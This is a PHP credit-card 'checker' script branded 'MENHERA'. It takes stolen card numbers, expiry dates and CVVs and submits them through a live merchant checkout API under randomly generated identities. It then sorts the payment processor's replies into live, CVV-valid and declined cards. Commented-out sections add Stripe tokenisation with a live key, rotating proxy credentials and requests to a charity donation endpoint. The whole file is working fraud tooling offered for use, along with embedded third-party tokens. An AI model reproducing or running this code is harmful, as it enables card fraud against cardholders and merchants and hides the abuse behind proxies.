<?php

#┣┯┯┯┯┯┯┯┯┯┯《𝕄𝔼ℕ ℍ𝔼ℝ𝔸》┣┯┯┯┯┯┯┯┯┯┯#

/*
 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎 ➪ 

• Support all gateways
• Support all sites
• Formulated with all types of proxies
• Stripe MUID & GUID randomized
• Auto Capture Cookies
• Easy & Comfortable

 𝙒𝘼𝙍𝙉𝙄𝙉𝙂 ➪
 
• If you are going to change credits or leak 
please fuck off lad
• More Updates on the way*/



#┣┯┯┯┯┯┯┯┯┯┯《𝕊ℂℝ𝕀ℙ𝕋 ℍ𝔼ℝ𝔼》┣┯┯┯┯┯┯┯┯┯┯#

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
#┣┯┯┯┯┯┯┯┯┯┯《𝕍𝔸ℝ𝕀𝔸𝔹𝕃𝔼𝕊》┣┯┯┯┯┯┯┯┯┯┯#


$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

#┣┯┯┯┯┯┯┯┯┯┯《ℕ 𝕆𝕋𝔼𝕊》┣┯┯┯┯┯┯┯┯┯┯#

/*
$n = firstname , $l = lastname , $e = email..
Look the above func for more information */


#┣┯┯┯┯┯┯┯┯┯┯《𝔽𝕌ℕℂ𝕋𝕀𝕆ℕ𝕊》┣┯┯┯┯┯┯┯┯┯┯#


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


#┣┯┯┯┯┯┯┯┯┯┯《ℝ𝔸ℝ𝔼 𝔽𝕌ℕℂ𝕋𝕀𝕆ℕ》┣┯┯┯┯┯┯┯┯┯┯#


function MENHA($n) {
    $a = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $b = '';
 
    for ($i = 0; $i < $n; $i++) {
        $c = rand(0, strlen($a) - 1);
        $b .= $a[$c];
    }
    return $b;
}

$guid = MENHA(8).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(18);
$muid = MENHA(8).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(18);
$sid = MENHA(8).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(4).'-'.MENHA(18);

//RESPONSE//

$amount = "36$";

$user = "MENHERA" ;

//CC PROTOCOL//


$info = curl_getinfo($ch);    
$time = $info['total_time'];

#┣┯┯┯┯┯┯┯┯《𝕎𝔼𝔹𝕊ℍ𝔸ℝ𝔼 ℙℝ𝕆𝕏𝕐》┣┯┯┯┯┯┯┯┯#

//=======================[Proxys]=============================//
/*$rp1 = array(
  1 => 'juhgsvhq-rotate:3qxo0ufxjsge',
  2 => 'hlbjmnic-rotate:n8zphf01s7ko',
  3 => 'gvrvimms-rotate:9l7frp6evqo',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';*/

#┣┯┯┯┯┯┯┯┯《ℍ𝕋𝕋ℙ ℙℝ𝕆𝕏𝕐》┣┯┯┯┯┯┯┯┯#


/*function get_random_proxy($proxy_list_file)
{
    $proxies = file($proxy_list_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $selected_proxy = $proxies[array_rand($proxies)];
    return $selected_proxy;
}
$proxy = get_random_proxy('proxy.txt');
#echo 'selected proxy: ' . $proxy;
$ch = curl_init(CURLOPT_URL);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); // Use HTTP/HTTPS Proxy
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    #echo 'Error: ' . curl_error($ch);
} else {
    #echo 'Response: ' . $response;
}
curl_close($ch);*/


#┣┯┯┯┯┯┯┯┯《ℂ𝕆ℕ𝔽𝕀𝔾𝕌ℝ𝔸𝕋𝕀𝕆ℕ》┣┯┯┯┯┯┯┯┯#

/*if (!file_exists(getcwd().'/Cookies')) mkdir(getcwd().'/Cookies', 0777, true);
$Cookies = getcwd().'/Cookies/Cookie'.uniqid('Menhera', true).'.txt';*/


#┣┯┯┯┯┯┯┯┯《𝔽𝕀ℝ𝕊𝕋 ℝ𝔼ℚ𝕌𝔼𝕊𝕋》┣┯┯┯┯┯┯┯┯#


/*$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.gapminder.org/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
    'POST /wp-json/wpsp/v2/customer h2',
    'Host: www.gapminder.org',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept: **',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.gapminder.org',
    'Connection: keep-alive',
    'x-wp-nonce: 513d33b44b',
    'Referer: https://www.gapminder.org/donations/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, "");

$R1 = curl_exec($ch);
curl_close($ch);
$data = json_decode($R1, true);

$cuid = $data['customer']['id'];
$nonce = $data['nonce'];*/

#echo "Customer ID: " . $cuid . "\n";
#echo "Nonce: " . $nonce . "\n";

#echo "<br><b>R1: </b> $R1<br><br>";*/

#┣┯┯┯┯┯┯┯┯《𝕄𝕀𝔻𝔻𝕃𝔻 ℝ𝔼ℚ𝕌𝔼𝕊𝕋》┣┯┯┯┯┯┯┯┯#


/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
    'POST /v1/tokens h2',
    'Host: api.stripe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Connection: keep-alive',
    'Referer: https://js.stripe.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=31545&guid=57a31cc0-7cf5-430f-a7e0-f28db05b1f5e061e7f&muid=0ff8a70b-fc40-41cc-a9bf-6d80747f360c5c5a27&sid=fc5e21c4-9a50-4a1b-a416-b00c8952d0533c2783&key=pk_live_SvyXYSq4BlyLUiwqGzsUyGqg&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[name]=Menhgo&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]=10080');

$R0 = curl_exec($ch);
curl_close($ch);
$id = trim(strip_tags(getStr($R0,'"id": "','"')));
echo "<br><b>R0: </b> $R0<br><br>";
*/


#┣┯┯┯┯┯┯┯┯《𝕊𝔼ℂ𝕆ℕ𝔻 ℝ𝔼ℚ𝕌𝔼𝕊𝕋》┣┯┯┯┯┯┯┯┯#


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://live-api.checkoutchamp.com/providersApi/V1/Import/Order');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
    'POST /providersApi/V1/Import/Order h2',
    'Host: live-api.checkoutchamp.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json; charset=utf-8',
    'Origin: https://www.basementbeast.com',
    'funnelreferenceid: 294ff191-d793-45f3-a9bb-ea9c115b6d1a',
    'companytoken: f4eb98c0-499c-11ed-a4bc-f34f5dd5fe69',
    'Connection: keep-alive',
    'Referer: https://www.basementbeast.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $Cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $Cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"firstName":"Kon","lastName":"Menhera","companyName":null,"address1":"","address2":"","postalCode":"","city":"","state":null,"country":"US","emailAddress":"menheragodzjjsjsaaj@gmail.com","phoneNumber":"3049282728","gender":null,"dob":null,"couponCode":null,"shipProfileId":null,"custom1":"members area pages","custom2":"Beast 365 Checkout","custom3":null,"custom4":null,"custom5":null,"redirectsTo":"https://www.basementbeast.com/beast365-members-thank-you","errorRedirectsTo":"https://www.basementbeast.com/beast365-checkout?products=32:1","browserData":"{\"acceptHeader\":\"application/json\",\"userAgent\":\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36\",\"language\":\"en-IN\",\"timezone\":\"-330\",\"colorDepth\":24,\"screen\":{\"height\":\"873\",\"width\":\"393\"},\"javaScriptEnabled\":true,\"javaEnabled\":false}","billShipSame":1,"salesUrl":"https://www.basementbeast.com/beast365-checkout?products=32:1","cartId":null,"campaignId":2,"orderId":"63A9FBD226","shipFirstName":"Kon","shipLastName":"Menhera","shipAddress1":null,"shipAddress2":null,"shipCity":null,"shipState":null,"shipPostalCode":null,"shipCountry":"US","cardNumber":"'.$cc.'","cardMonth":'.$mes.',"cardYear":'.$ano.',"cardSecurityCode":"'.$cvv.'","paySource":"CREDITCARD","forceMerchantId":null,"product1_id":"32","product1_qty":1,"product1_shipPrice":0,"totalShipping":0,"eci":null,"cavv":null,"xid":null,"rebill_eci":null,"rebill_cavv":null,"rebill_xid":null,"sessionId":"6fe6f2604e644c4f9abdd606297188b1","insureShipment":0,"shipmentInsurancePrice":"","currencyCode":"USD"}');

$R2 = curl_exec($ch);
curl_close($ch);

$message  = trim(strip_tags(getStr($R2, '"message":"', '"')));
$response = trim(strip_tags(getStr($R2, '"message_code":"', '"')));

echo "<br><b>R2: </b> $R2<br><br>";

#┣┯┯┯┯┯┯┯┯《ℝ𝔼𝕊ℙ𝕆ℕ𝕊𝔼》┣┯┯┯┯┯┯┯┯#

   #CCN
if ((strpos($R2, "Transaction Declined: Incorrect Cvc")) || (strpos($R2, "Transaction Declined: Invalid Account")) || (strpos($R2, "Transaction Declined: Invalid Cvc"))) {
    $status  = '#CCN';
    $cc_code = '400';
    $response = 'Security code is incorrect. ❎';
    
    #CHARGED
} elseif ((strpos($R2, 'MERC_REDIRECT')) || (strpos($R2, ''))) {
    $status  = '#CCN';
    $cc_code = '300';
    $response = '3D-NON-VBV (hooks.stripe.com). ✅';
  
   } elseif ((strpos($R2, 'Transaction Declined: Transaction Not Allowed')) || (strpos($R2, ''))) {
    $status  = '#CCN';
    $cc_code = '300';
    $response = 'Transaction not allowed. ✅';
    #CVV
} elseif (strpos($R2, "Insufficient funds")) {
    $status  = '#CVV';
    $cc_code = '200';
    $response = 'Insufficient Balance. ✅';
    
    #DEAD
} elseif (strpos($R2, "Invalid transaction")) {
    $status  = '#DECLINED';
    $cc_code = '109';
    $response = 'Invalid transaction. ❌';
    
    
} elseif ((strpos($R2, 'The card number is incorrect.')) || (strpos($R2, 'Your card number is incorrect.')) || (strpos($R2, 'Transaction not permitted by issuer'))) {
    $status  = '#DECLINED';
    $cc_code = '109';
    $response = 'Transaction not permitted by issuer.❌';
    
} elseif ((strpos($R2, 'Transaction Declined: Do Not Honor')) || (strpos($R2, 'Transaction Declined: Pick up card - NF')) || (strpos($R2, 'Transaction Declined: Pick up card - S'))) {
    $status  = '#DECLINED';
    $cc_code = '105';
    $response = 'Do not honor.❌';
    
} elseif (strpos($R2, "Transaction Declined: Generic Decline")) {
    $status  = '#DECLINED';
    $cc_code = '110';
    $response = 'Generic Decline. ❌';
    
} elseif (strpos($R2, "Object reference not set to an instance of an object
")) {
    $status  = '#DECLINED';
    $cc_code = '102';
    $response = 'Your card was declined.❌';
} else {
    $status  = '#DECLINED';
    $cc_code = '0000';
    $response = 'Passed.';
}

echo '<div><a  style="
    height: 20px;                        
    font-weight: 600 !important;
    font-family: Teko; !important;
    font-size: 15px !important;
    text-transform: uppercase;
    letter-spacing: 1px;
"><b>[ '.$status.' ] [G9] ➜ [ STRIPE TOKENS ] ➜ [ R - '.$cc_code.' ] </b> ➜ `' . $lista . '`➜ <b> [ d_code - '.$response.' ] ➜ [ '.$user.' ] </b> <br><span><br>';
ob_flush();
